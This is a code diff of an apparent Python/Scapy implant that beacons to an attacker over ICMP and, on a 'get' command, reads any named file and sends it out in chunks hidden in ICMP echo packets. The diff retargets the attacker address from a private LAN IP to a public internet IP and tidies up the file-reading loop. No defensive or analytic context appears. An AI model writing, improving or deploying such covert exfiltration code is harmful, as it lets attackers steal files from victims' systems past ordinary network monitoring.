@@ -3,9 +3,9 @@ import subprocess
 import os
 import time
 
-Att_ip="192.168.1.30"
+Att_ip="54.147.240.6"
 ICMP_ID_HELO = 23144
-ICMP_ID = 13331
+ICMP_ID = 63466
 is_ready = False
 TTL = int(64)
 my_iface =  "ens160"
@@ -23,19 +23,19 @@ def beac_n_listen():
 
             if first_word == "get":
                 curr_seq = 1
-                file = open(payload.split()[1], 'rb') 
-                while True:  
-                    chunk = file.read(mtu)        
-                    if not chunk: 
-                        break 
-                    while True:
-                        send(IP(dst=Att_ip) / ICMP(id=ICMP_ID, type=8, seq=curr_seq) / chunk)
-                        # sniff till you get an ok for certain part
-                        pkt = sniff(filter="icmp", count=1, timeout=3)
-                        if pkt:
-                            if pkt[0][ICMP].seq == curr_seq:
-                                curr_seq = curr_seq + 1
-                                break
+                with open(payload.split()[1], 'rb') as file:
+                    while True:  
+                        chunk = file.read(mtu)        
+                        if not chunk: 
+                            break 
+                        while True:
+                            send(IP(dst=Att_ip) / ICMP(id=ICMP_ID, type=8, seq=curr_seq) / chunk)
+                            # sniff till you get an ok for certain part
+                            pkt = sniff(filter="icmp", count=1, timeout=3)
+                            if pkt:
+                                if pkt[0][ICMP].seq == curr_seq:
+                                    curr_seq = curr_seq + 1
+                                    break
                 while True:
                     send(IP(dst=Att_ip) / ICMP(id=ICMP_ID, type=8, seq=curr_seq) / "end")
                     sniff(filter="icmp", count=1, timeout = 3)
